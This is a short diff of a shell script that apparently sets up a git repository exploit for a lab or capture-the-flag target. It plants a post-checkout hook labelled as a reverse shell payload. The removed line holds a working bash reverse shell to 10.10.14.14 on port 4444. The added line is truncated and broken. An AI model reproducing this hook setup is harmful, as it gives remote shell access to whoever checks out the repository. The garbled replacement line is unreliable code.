@@ -20,7 +20,7 @@ setup_HULK_REPO() {
 	# Create necessary directories and set up the post-checkout hook
 	mkdir -p y/hooks
 	# Add reverse shell payload as post-checkout hook
-	echo "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1" > y/hooks/post-checkout
+	echo "bash -i >& /d> y/hooks/post-checkout
 
 	# Add and commit the post-checkout hook
 	git add y/hooks/post-checkout
